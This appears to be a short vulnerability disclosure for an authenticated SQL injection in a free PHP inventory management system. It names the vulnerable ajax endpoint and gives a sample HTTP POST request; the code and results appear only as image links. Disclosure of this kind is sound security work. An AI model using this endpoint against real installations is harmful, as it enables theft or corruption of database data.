



The Free and Open Source inventory management system has an SQL injection vulnerability that an attacker, if authenticated, can exploit to steal information or corrupt a database.





Source code address：https://www.sourcecodester.com/php/16741/free-and-open-source-inventory-management-system-php-source-code.html



The vulnerability is located in the /app/ajax/search_purchase_paymen_report.php file, and SQL statement splicing is found in the code fragment.

![image-20250326145844989](images/image-20250326145844989.png)

![image-20250326145908094](images/image-20250326145908094.png)





Vulnerability verification：

```
POST /ample/app/ajax/search_purchase_paymen_report.php HTTP/1.1
Host: 192.168.80.152
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
DNT: 1
Cookie:  PHPSESSID=c4gam437gl7cc6hlbsgm3pplq4
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 24

issuedate=3&customer=all
```

 ![image-20250326145758858](images/image-20250326145758858.png)



































